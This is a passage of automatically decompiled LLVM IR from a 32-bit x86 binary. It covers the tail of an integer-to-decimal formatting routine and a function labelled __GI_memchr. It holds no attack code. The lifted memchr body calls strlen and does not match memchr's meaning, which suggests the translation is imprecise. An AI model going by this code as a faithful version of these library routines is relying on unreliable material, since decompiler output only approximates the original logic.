  %v2_804f7d0 = add i32 %v1_804f7d0, 4
  %v3_804f7d0 = inttoptr i32 %v2_804f7d0 to i32*
  store i32 %v1_804f7ce, i32* %v3_804f7d0, align 4
  %v0_804f7d3 = load i32, i32* @ecx, align 4
  %v1_804f7d3 = add i32 %v0_804f7d3, 8
  %v2_804f7d3 = inttoptr i32 %v1_804f7d3 to i32*
  store i32 ptrtoint (i32* @global_var_80515af.132 to i32), i32* %v2_804f7d3, align 4
  %v0_804f7da = load i32, i32* @ecx, align 4
  %v1_804f7da = add i32 %v0_804f7da, 12
  store i32 %v1_804f7da, i32* @ecx, align 4
  br label %dec_label_pc_804f7dd

dec_label_pc_804f7dd:                             ; preds = %dec_label_pc_804f7c3, %dec_label_pc_804f7c6
  %v0_804f7e1 = phi i32 [ %v0_804f7c8, %dec_label_pc_804f7c3 ], [ %v1_804f7da, %dec_label_pc_804f7c6 ]
  %v0_804f7dd = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7dd = icmp eq i32 %v0_804f7dd, 0
  br i1 %v1_804f7dd, label %dec_label_pc_804f7f0, label %dec_label_pc_804f7e1

dec_label_pc_804f7e1:                             ; preds = %dec_label_pc_804f7dd
  %v1_804f7e1 = inttoptr i32 %v0_804f7e1 to i32*
  store i32 112, i32* %v1_804f7e1, align 4
  %v0_804f7e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7e7 = load i32, i32* @ecx, align 4
  %v2_804f7e7 = add i32 %v1_804f7e7, 4
  %v3_804f7e7 = inttoptr i32 %v2_804f7e7 to i32*
  store i32 %v0_804f7e7, i32* %v3_804f7e7, align 4
  %v0_804f7ea = load i32, i32* %edi.global-to-local, align 4
  %v1_804f7ea = load i32, i32* @ecx, align 4
  %v2_804f7ea = add i32 %v1_804f7ea, 8
  %v3_804f7ea = inttoptr i32 %v2_804f7ea to i32*
  store i32 %v0_804f7ea, i32* %v3_804f7ea, align 4
  %v0_804f7ed = load i32, i32* @ecx, align 4
  %v1_804f7ed = add i32 %v0_804f7ed, 12
  store i32 %v1_804f7ed, i32* @ecx, align 4
  br label %dec_label_pc_804f7f0

dec_label_pc_804f7f0:                             ; preds = %dec_label_pc_804f7dd, %dec_label_pc_804f7e1
  %v0_804f80e = phi i32 [ %v0_804f7e1, %dec_label_pc_804f7dd ], [ %v1_804f7ed, %dec_label_pc_804f7e1 ]
  br i1 %v1_804f60a, label %dec_label_pc_804f804, label %dec_label_pc_804f7f7

dec_label_pc_804f7f7:                             ; preds = %dec_label_pc_804f7f0
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_804f7fe = load i8, i8* %v2_804f797, align 1
  %v4_804f7fe = and i8 %v3_804f7fe, 16
  %v5_804f7fe = icmp eq i8 %v4_804f7fe, 0
  br i1 %v5_804f7fe, label %dec_label_pc_804f821, label %dec_label_pc_804f804

dec_label_pc_804f804:                             ; preds = %dec_label_pc_804f7f7, %dec_label_pc_804f7f0
  %v0_804f804 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f806 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f806 = sub i32 %v0_804f804, %v1_804f806
  store i32 %v2_804f806, i32* %eax.global-to-local, align 4
  %v1_804f808 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f808 = sub i32 %v2_804f806, %v1_804f808
  %v8_804f808 = xor i32 %v1_804f808, %v2_804f806
  %v9_804f808 = xor i32 %v2_804f808, %v2_804f806
  %v10_804f808 = and i32 %v9_804f808, %v8_804f808
  %v11_804f808 = icmp slt i32 %v10_804f808, 0
  %v13_804f808 = icmp slt i32 %v2_804f808, 0
  %v2_804f80a = icmp eq i1 %v13_804f808, %v11_804f808
  br i1 %v2_804f80a, label %dec_label_pc_804f821, label %dec_label_pc_804f80c

dec_label_pc_804f80c:                             ; preds = %dec_label_pc_804f804
  %v2_804f80c = sub i32 %v1_804f808, %v2_804f806
  store i32 %v2_804f80c, i32* %ebp.global-to-local, align 4
  %v1_804f80e = inttoptr i32 %v0_804f80e to i32*
  store i32 176, i32* %v1_804f80e, align 4
  %v0_804f814 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f814 = load i32, i32* @ecx, align 4
  %v2_804f814 = add i32 %v1_804f814, 4
  %v3_804f814 = inttoptr i32 %v2_804f814 to i32*
  store i32 %v0_804f814, i32* %v3_804f814, align 4
  %v0_804f817 = load i32, i32* @ecx, align 4
  %v1_804f817 = add i32 %v0_804f817, 8
  %v2_804f817 = inttoptr i32 %v1_804f817 to i32*
  store i32 ptrtoint (i32* @global_var_80515af.132 to i32), i32* %v2_804f817, align 4
  %v0_804f81e = load i32, i32* @ecx, align 4
  %v1_804f81e = add i32 %v0_804f81e, 12
  store i32 %v1_804f81e, i32* @ecx, align 4
  br label %dec_label_pc_804f821

dec_label_pc_804f821:                             ; preds = %dec_label_pc_804f804, %dec_label_pc_804f7f7, %dec_label_pc_804f80c
  %v1_804f8a484 = phi i32 [ %v0_804f80e, %dec_label_pc_804f804 ], [ %v0_804f80e, %dec_label_pc_804f7f7 ], [ %v1_804f81e, %dec_label_pc_804f80c ]
  %v12_804f821 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804f821, label %dec_label_pc_804f897, label %dec_label_pc_804f828

dec_label_pc_804f828:                             ; preds = %dec_label_pc_804f821
  %v0_804f82f = load i32, i32* %esi.global-to-local, align 4
  %v2_804f82f = icmp slt i32 %v0_804f82f, 0
  %v1_804f831 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_804f82f, i32* %edx.global-to-local, align 4
  br i1 %v2_804f82f, label %dec_label_pc_804f840, label %dec_label_pc_804f837

dec_label_pc_804f837:                             ; preds = %dec_label_pc_804f828
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f849

dec_label_pc_804f840:                             ; preds = %dec_label_pc_804f828
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_804f847 = sub i32 0, %v0_804f82f
  store i32 %v1_804f847, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f849

dec_label_pc_804f849:                             ; preds = %dec_label_pc_804f837, %dec_label_pc_804f840
  %v0_804f85d77 = phi i32 [ %v0_804f82f, %dec_label_pc_804f837 ], [ %v1_804f847, %dec_label_pc_804f840 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804f851 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804f851, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f85d

dec_label_pc_804f85d:                             ; preds = %dec_label_pc_804f85d.backedge, %dec_label_pc_804f849
  %v0_804f86b = phi i32 [ %v0_804f86e, %dec_label_pc_804f85d.backedge ], [ 2, %dec_label_pc_804f849 ]
  %v0_804f867 = phi i32 [ %v0_804f867.pre, %dec_label_pc_804f85d.backedge ], [ %v2_804f851, %dec_label_pc_804f849 ]
  %v0_804f85d = phi i32 [ %v9_804f865, %dec_label_pc_804f85d.backedge ], [ %v0_804f85d77, %dec_label_pc_804f849 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_804f864 = ashr i32 %v0_804f85d, 31
  %v2_804f865 = zext i32 %v0_804f85d to i64
  %v4_804f865 = zext i32 %v1_804f864 to i64
  %v5_804f865 = mul nuw i64 %v4_804f865, 4294967296
  %v6_804f865 = or i64 %v5_804f865, %v2_804f865
  %v8_804f865 = sdiv i64 %v6_804f865, 10
  %v9_804f865 = trunc i64 %v8_804f865 to i32
  store i32 %v9_804f865, i32* %eax.global-to-local, align 4
  %v11_804f865 = srem i64 %v6_804f865, 10
  %v12_804f865 = trunc i64 %v11_804f865 to i8
  %v1_804f867 = add i32 %v0_804f867, -1
  store i32 %v1_804f867, i32* %ebx.global-to-local, align 4
  %v1_804f868 = add i8 %v12_804f865, 48
  %v1_804f86b = add i32 %v0_804f86b, 1
  store i32 %v1_804f86b, i32* %esi.global-to-local, align 4
  %v3_804f86c = inttoptr i32 %v1_804f867 to i8*
  store i8 %v1_804f868, i8* %v3_804f86c, align 1
  %v0_804f86e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_804f865, i32* %edx.global-to-local, align 4
  %v7_804f873 = icmp sgt i32 %v0_804f86e, 3
  br i1 %v7_804f873, label %dec_label_pc_804f875, label %dec_label_pc_804f85d.backedge

dec_label_pc_804f875:                             ; preds = %dec_label_pc_804f85d
  %v2_804f875 = icmp eq i32 %v9_804f865, 0
  %v1_804f877 = icmp eq i1 %v2_804f875, false
  br i1 %v1_804f877, label %dec_label_pc_804f85d.backedge, label %dec_label_pc_804f879

dec_label_pc_804f85d.backedge:                    ; preds = %dec_label_pc_804f875, %dec_label_pc_804f85d
  %v0_804f867.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f85d

dec_label_pc_804f879:                             ; preds = %dec_label_pc_804f875
  %v0_804f879 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f879, i32* %edx.global-to-local, align 4
  %v0_804f87b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f87b = add i32 %v0_804f87b, -2
  store i32 %v1_804f87b, i32* %eax.global-to-local, align 4
  %v1_804f87e = trunc i32 %v0_804f879 to i8
  %v3_804f87e = add i32 %v0_804f87b, -1
  %v4_804f87e = inttoptr i32 %v3_804f87e to i8*
  store i8 %v1_804f87e, i8* %v4_804f87e, align 1
  %v5_804f881 = load i32, i32* %edx.global-to-local, align 4
  %v6_804f881 = and i32 %v5_804f881, -256
  %v7_804f881 = or i32 %v6_804f881, %stack_var_-42.0
  store i32 %v7_804f881, i32* %edx.global-to-local, align 4
  %v2_804f885 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804f885 = add i32 %v2_804f885, -2
  %v4_804f885 = inttoptr i32 %v3_804f885 to i8*
  store i8 %v1_804f831, i8* %v4_804f885, align 1
  %v0_804f888 = load i32, i32* @ecx, align 4
  %v1_804f888 = inttoptr i32 %v0_804f888 to i32*
  store i32 112, i32* %v1_804f888, align 4
  %v0_804f88e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f88e = load i32, i32* @ecx, align 4
  %v2_804f88e = add i32 %v1_804f88e, 4
  %v3_804f88e = inttoptr i32 %v2_804f88e to i32*
  store i32 %v0_804f88e, i32* %v3_804f88e, align 4
  %v0_804f891 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f891 = load i32, i32* @ecx, align 4
  %v2_804f891 = add i32 %v1_804f891, 8
  %v3_804f891 = inttoptr i32 %v2_804f891 to i32*
  store i32 %v0_804f891, i32* %v3_804f891, align 4
  %v0_804f894 = load i32, i32* @ecx, align 4
  %v1_804f894 = add i32 %v0_804f894, 12
  store i32 %v1_804f894, i32* @ecx, align 4
  br label %dec_label_pc_804f897

dec_label_pc_804f897:                             ; preds = %dec_label_pc_804f821, %dec_label_pc_804f4bc, %dec_label_pc_804f879
  %v0_804f918 = phi i32 [ %v1_804f8a484, %dec_label_pc_804f821 ], [ %v2_804f4c4, %dec_label_pc_804f4bc ], [ %v1_804f894, %dec_label_pc_804f879 ]
  %v2_804f897 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804f897, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f89b

dec_label_pc_804f89b:                             ; preds = %dec_label_pc_804f89b, %dec_label_pc_804f897
  %v0_804f89b = phi i32 [ %v2_804f897, %dec_label_pc_804f897 ], [ %v1_804f89d, %dec_label_pc_804f89b ]
  %stack_var_-216.0 = phi i32 [ %v3_804f3af, %dec_label_pc_804f897 ], [ %v5_804f8a0, %dec_label_pc_804f89b ]
  %v1_804f89b = inttoptr i32 %v0_804f89b to i32*
  %v2_804f89b = load i32, i32* %v1_804f89b, align 4
  store i32 %v2_804f89b, i32* %edx.global-to-local, align 4
  %v1_804f89d = add i32 %v0_804f89b, 12
  store i32 %v1_804f89d, i32* %eax.global-to-local, align 4
  %v5_804f8a0 = sub i32 %stack_var_-216.0, %v2_804f89b
  %v7_804f8a4 = icmp ult i32 %v1_804f89d, %v0_804f918
  br i1 %v7_804f8a4, label %dec_label_pc_804f89b, label %dec_label_pc_804f8a8

dec_label_pc_804f8a8:                             ; preds = %dec_label_pc_804f89b
  %v5_804f8b1 = icmp eq i8 %stack_var_-26.0, 0
  %v1_804f8c1 = icmp eq i1 %v5_804f8b1, false
  %v2_804f8c1 = zext i1 %v1_804f8c1 to i32
  %v2_804f8c4 = sub i32 %v5_804f8a0, %v2_804f8c1
  store i32 %v2_804f8c4, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_804f8c4, i32* %eax.global-to-local, align 4
  store i32 %v0_804f918, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_804f8c4, 1
  br i1 %tmp141, label %dec_label_pc_804f91a, label %dec_label_pc_804f8da

dec_label_pc_804f8da:                             ; preds = %dec_label_pc_804f8a8
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_804f8e1 = inttoptr i32 %v1_804f3ef to i8*
  %v3_804f8e1 = load i8, i8* %v2_804f8e1, align 1
  %v4_804f8e1 = and i8 %v3_804f8e1, 8
  %v5_804f8e1 = icmp eq i8 %v4_804f8e1, 0
  br i1 %v5_804f8e1, label %dec_label_pc_804f8fc, label %dec_label_pc_804f8e7

dec_label_pc_804f8e7:                             ; preds = %dec_label_pc_804f8da
  %v1_804f8e7 = add i32 %v0_804f918, 12
  store i32 %v1_804f8e7, i32* %esi.global-to-local, align 4
  %v1_804f8ea = inttoptr i32 %v0_804f918 to i32*
  store i32 160, i32* %v1_804f8ea, align 4
  %v0_804f8f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f8f0 = load i32, i32* @ecx, align 4
  %v2_804f8f0 = add i32 %v1_804f8f0, 4
  %v3_804f8f0 = inttoptr i32 %v2_804f8f0 to i32*
  store i32 %v0_804f8f0, i32* %v3_804f8f0, align 4
  %v0_804f8f3 = load i32, i32* @ecx, align 4
  %v1_804f8f3 = add i32 %v0_804f8f3, 8
  %v2_804f8f3 = inttoptr i32 %v1_804f8f3 to i32*
  store i32 ptrtoint (i32* @global_var_80515af.132 to i32), i32* %v2_804f8f3, align 4
  br label %dec_label_pc_804f91a

dec_label_pc_804f8fc:                             ; preds = %dec_label_pc_804f8da
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804f903 = add i32 %tmp112, 16
  %v2_804f903 = inttoptr i32 %v1_804f903 to i32*
  %v3_804f903 = load i32, i32* %v2_804f903, align 4
  %v9_804f903 = icmp eq i32 %v3_804f903, 48
  %v1_804f907 = icmp eq i1 %v9_804f903, false
  br i1 %v1_804f907, label %dec_label_pc_804f914, label %dec_label_pc_804f909

dec_label_pc_804f909:                             ; preds = %dec_label_pc_804f8fc
  %v3_804f909 = load i32, i32* %stack_var_-152, align 4
  %v5_804f909 = add i32 %v3_804f909, %v2_804f8c4
  store i32 %v5_804f909, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804f918

dec_label_pc_804f90f:                             ; preds = %dec_label_pc_804f920
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f947

dec_label_pc_804f914:                             ; preds = %dec_label_pc_804f8fc
  br label %dec_label_pc_804f918

dec_label_pc_804f918:                             ; preds = %dec_label_pc_804f909, %dec_label_pc_804f914
  store i32 %v0_804f918, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f91a

dec_label_pc_804f91a:                             ; preds = %dec_label_pc_804f8a8, %dec_label_pc_804f8e7, %dec_label_pc_804f918
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804f91c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804f91c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f920

dec_label_pc_804f920:                             ; preds = %dec_label_pc_804f93e, %dec_label_pc_804f91a
  call void @__pseudo_call(i32 %tmp112)
  %v0_804f939 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f939 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f939 = add i32 %v1_804f939, 4
  %v3_804f939 = inttoptr i32 %v2_804f939 to i32*
  %v4_804f939 = load i32, i32* %v3_804f939, align 4
  %v15_804f939 = icmp eq i32 %v0_804f939, %v4_804f939
  %v1_804f93c = icmp eq i1 %v15_804f939, false
  br i1 %v1_804f93c, label %dec_label_pc_804f90f, label %dec_label_pc_804f93e

dec_label_pc_804f93e:                             ; preds = %dec_label_pc_804f920
  %v1_804f93e = add i32 %v1_804f939, 12
  store i32 %v1_804f93e, i32* %ebx.global-to-local, align 4
  %v0_804f941 = load i32, i32* %edi.global-to-local, align 4
  %v2_804f941 = add i32 %v0_804f941, %v0_804f939
  store i32 %v2_804f941, i32* %edi.global-to-local, align 4
  %v1_804f943 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f943 = icmp ult i32 %v1_804f93e, %v1_804f943
  br i1 %v7_804f943, label %dec_label_pc_804f920, label %dec_label_pc_804f947

dec_label_pc_804f947:                             ; preds = %dec_label_pc_804f93e, %dec_label_pc_804f90f
  %v0_804f94d = phi i32 [ -1, %dec_label_pc_804f90f ], [ %v2_804f941, %dec_label_pc_804f93e ]
  store i32 %v0_804f94d, i32* %eax.global-to-local, align 4
  %v2_804f950 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f950, i32* @esi, align 4
  store i32 %v0_804f392, i32* @edi, align 4
  store i32 %v0_804f391, i32* @ebp, align 4
  ret i32 %v0_804f94d

; uselistorder directives
  uselistorder i32 %v0_804f94d, { 1, 0 }
  uselistorder i32 %v1_804f89d, { 1, 2, 0 }
  uselistorder i32 %v0_804f89b, { 1, 0 }
  uselistorder i32 %v0_804f918, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_804f86e, { 1, 0 }
  uselistorder i32 %v9_804f865, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f85d, { 1, 0 }
  uselistorder i32 %v0_804f82f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804f808, { 1, 0 }
  uselistorder i32 %v1_804f808, { 1, 0, 2 }
  uselistorder i32 %v2_804f806, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804f73c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804f722, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804f787, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_804f6ed, { 0, 2, 1 }
  uselistorder i32 %v1_804f6c6, { 1, 0 }
  uselistorder i32 %v0_804f6c1, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804f68e, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804f689, { 1, 0 }
  uselistorder i8 %v2_804f682, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804f682, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f60c, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_804f5f1, { 1, 0 }
  uselistorder i32 %v1_804f5dd, { 1, 0 }
  uselistorder i32 %v0_804f5d1, { 1, 0 }
  uselistorder i32 %v4_804f5b8, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804f5bd, { 1, 0 }
  uselistorder i32 %v2_804f57b, { 1, 0, 2 }
  uselistorder i3 %v1_804f431, { 1, 0 }
  uselistorder i8 %v4_804f4b0, { 1, 0 }
  uselistorder i32 %v3_804f3ef, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_804f3ef, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_804f3c1, { 1, 0 }
  uselistorder i32 %v3_804f3af, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st1.global-to-local, { 1, 0, 2 }
  uselistorder x86_fp80* %st0.global-to-local, { 0, 2, 3, 1 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6, 9, 13, 12, 14, 10, 11, 15, 18, 16, 19, 17, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 23, 10, 11, 24, 13, 14, 12, 18, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 2, 7, 8, 3, 9, 6, 4, 10, 5, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 4, 5, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i8 8, { 3, 4, 2, 5, 6, 0, 7, 8, 1 }
  uselistorder i32 160, { 2, 1, 0, 3 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i64 4294967296, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 45, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 43, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i8 16, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i32 112, { 4, 5, 6, 2, 0, 1, 3 }
  uselistorder i8 48, { 12, 14, 2, 3, 6, 5, 4, 7, 8, 9, 10, 0, 11, 1, 13 }
  uselistorder i32* @esp, { 22, 5, 23, 24, 25, 26, 6, 27, 28, 29, 30, 31, 8, 32, 33, 34, 10, 35, 11, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 9, 48, 12, 49, 50, 51, 13, 52, 53, 54, 55, 56, 57, 58, 59, 7, 60, 0, 1, 61, 62, 63, 64, 65, 66, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 20, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 16, 108, 109, 110, 17, 111, 14, 112, 113, 114, 115, 116, 117, 18, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 15, 131, 132, 133, 134, 135, 136, 19, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 2, 3, 4, 82, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 21, 83, 84, 85, 86, 158, 159, 160, 161, 162, 163, 164 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 4, 7, 5, 6, 9, 8, 3 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 48, { 0, 9, 6, 3, 1, 7, 8, 13, 14, 15, 16, 18, 17, 4, 10, 5, 2, 19, 20, 12, 11 }
  uselistorder i32 10, { 17, 9, 8, 13, 1, 11, 0, 14, 2, 23, 24, 25, 26, 27, 28, 3, 18, 19, 21, 20, 4, 6, 29, 7, 16, 22, 10, 30, 15, 31, 32, 12, 5 }
  uselistorder i32 9, { 6, 7, 12, 8, 9, 10, 11, 13, 14, 15, 16, 3, 1, 5, 4, 2, 0 }
  uselistorder i16 256, { 0, 3, 1, 2 }
  uselistorder i32 -65536, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder i32 68, { 0, 3, 4, 1, 5, 2 }
  uselistorder i8 32, { 7, 0, 1, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 10, 2, 5, 3, 6, 4 }
  uselistorder i32 12, { 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 45, 32, 46, 33, 0, 1, 34, 35, 6, 7, 36, 2, 95, 47, 48, 49, 3, 50, 16, 37, 96, 51, 52, 62, 18, 17, 8, 53, 9, 10, 11, 12, 13, 14, 15, 21, 38, 55, 54, 39, 40, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 19, 94, 56, 57, 58, 59, 41, 42, 4, 20, 43, 44, 60, 5, 61 }
  uselistorder i32 6, { 10, 11, 12, 13, 1, 0, 2, 14, 15, 3, 4, 5, 9, 7, 8, 6, 16 }
  uselistorder i32 32, { 36, 16, 37, 38, 19, 39, 40, 41, 42, 43, 44, 45, 0, 46, 47, 29, 50, 20, 51, 52, 18, 22, 53, 54, 55, 65, 66, 56, 57, 32, 58, 59, 60, 30, 31, 67, 23, 35, 49, 17, 2, 1, 3, 4, 33, 5, 48, 6, 7, 8, 9, 10, 11, 21, 13, 12, 25, 27, 15, 14, 26, 61, 62, 63, 64, 28, 24, 34 }
  uselistorder label %dec_label_pc_804f91a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f918, { 1, 0 }
  uselistorder label %dec_label_pc_804f897, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f849, { 1, 0 }
  uselistorder label %dec_label_pc_804f821, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7f0, { 1, 0 }
  uselistorder label %dec_label_pc_804f7dd, { 1, 0 }
  uselistorder label %dec_label_pc_804f7c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f790, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f77b, { 1, 0 }
  uselistorder label %dec_label_pc_804f770, { 1, 0 }
  uselistorder label %dec_label_pc_804f6f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f6e9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f6af, { 1, 0 }
  uselistorder label %dec_label_pc_804f67f.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f64b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f61a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f605, { 1, 0 }
  uselistorder label %dec_label_pc_804f4bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f3e0, { 1, 0 }
  uselistorder label %dec_label_pc_804f3d7, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804f954 = load i32, i32* @edi, align 4
  store i32 %v0_804f954, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_804f95b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f95b, i32* %edi.global-to-local, align 4
  %v1_804f963 = icmp eq i32 %arg3, 0
  store i1 %v1_804f963, i1* %zf.global-to-local, align 1
  br i1 %v1_804f963, label %dec_label_pc_804f973, label %dec_label_pc_804f967

dec_label_pc_804f967:                             ; preds = %entry
  %v2_804f967 = call i32 @_strlen(i8* %arg1)
  %v3_804f967 = mul i32 %v2_804f967, -1
  %v4_804f967 = add i32 %v3_804f967, -2
  store i32 %v4_804f967, i32* @ecx, align 4
  %v0_804f969 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804f969, label %dec_label_pc_804f967.dec_label_pc_804f970_crit_edge, label %dec_label_pc_804f96b

dec_label_pc_804f967.dec_label_pc_804f970_crit_edge: ; preds = %dec_label_pc_804f967
  %v0_804f970.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_804f970.pre, -1
  br label %dec_label_pc_804f970

dec_label_pc_804f96b:                             ; preds = %dec_label_pc_804f967
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f970

dec_label_pc_804f970:                             ; preds = %dec_label_pc_804f967.dec_label_pc_804f970_crit_edge, %dec_label_pc_804f96b
  %v0_804f970 = phi i32 [ %phitmp, %dec_label_pc_804f967.dec_label_pc_804f970_crit_edge ], [ 0, %dec_label_pc_804f96b ]
  %v8_804f970 = icmp eq i32 %v0_804f970, 0
  store i1 %v8_804f970, i1* %zf.global-to-local, align 1
  store i32 %v0_804f970, i32* %edi.global-to-local, align 4
  %v2_804f975.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f973

dec_label_pc_804f973:                             ; preds = %entry, %dec_label_pc_804f970
  %v2_804f975 = phi i32 [ %v0_804f954, %entry ], [ %v2_804f975.pre, %dec_label_pc_804f970 ]
  %v0_804f973 = phi i32 [ 0, %entry ], [ %v0_804f970, %dec_label_pc_804f970 ]
  store i32 %v2_804f975, i32* @edi, align 4
  ret i32 %v0_804f973

; uselistorder directives
  uselistorder i32 %v0_804f970, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804f973, { 1, 0 }
  uselistorder label %dec_label_pc_804f970, { 1, 0 }
}

